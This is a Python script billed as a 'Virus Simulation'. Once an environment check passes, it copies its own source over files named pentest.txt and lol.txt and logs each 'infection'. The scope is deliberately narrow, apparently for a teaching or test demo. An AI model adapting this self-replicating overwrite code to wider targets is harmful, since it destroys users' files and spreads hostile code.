
import os
import time
import random
import logging

class symbole11():
    '''
    ____      ____          __  _                ______           ______
   /  _/___  / __/__  _____/ /_(_)___  ____     / ____/________ _/ __/ /_
   / // __ \/ /_/ _ \/ ___/ __/ / __ \/ __ \   / /   / ___/ __ `/ /_/ __/
 _/ // / / / __/  __/ /__/ /_/ / /_/ / / / /  / /___/ /  / /_/ / __/ /_
/___/_/ /_/_/  \___/\___/\__/_/\____/_/ /_/   \____/_/   \__,_/_/  \__/

                    [+] Authodor : MedX267 [+]
                    [+] https://github.com/MedX267 [+]

    '''
print(symbole11.__doc__)


# Set up logging to write logs to a file
logging.basicConfig(filename='infection_log.txt', level=logging.INFO)

a = 0

# Function to check the safe environment
def check_safe_environment():
    # Modify the environment check to skip if you want to test in an unsafe environment
    safe_env = os.getenv("SAFE_ENV")
    if safe_env is None or safe_env != "YES":
        print("Warning: This program should only be run in a controlled and safe testing environment! Unauthorized use is prohibited.")
        return False  # Change to True for test
    return True


def main():
    global a

    if not check_safe_environment():
        return

    start_time = time.time()
    print("Virus Simulation")

    # Get all files in the current directory
    files_in_directory = os.listdir(".")

    for filename in files_in_directory:
        # Target only the pentest.txt file and lol.txt
        if filename == "pentest.txt" or filename == "lol.txt":  # Ensure the name matches
            print(f"Infecting: {filename}")

            try:
                # Read the program itself
                with open(__file__, "rb") as in_file:
                    file_data = in_file.read()

                # Open the target file in write-binary mode
                with open(filename, "rb+") as out_file:
                    # Write the virus code to the target file
                    out_file.write(file_data)

                # Log the infection in the log file
                logging.info(f"Infected file: {filename} at {time.time()}")

                a += 1
            except Exception as e:
                logging.error(f"Error infecting file {filename}: {e}")
                print(f"Error infecting {filename}: {e}")

            # Add a random delay between 1 and 5 seconds
            time.sleep(random.randint(1, 5))

    end_time = time.time()

    # Calculate the time taken
    print(f"\nTotal infected files are: {a}")
    print(f"Time taken: {end_time - start_time:.2f}s")

if __name__ == "__main__":
    main()


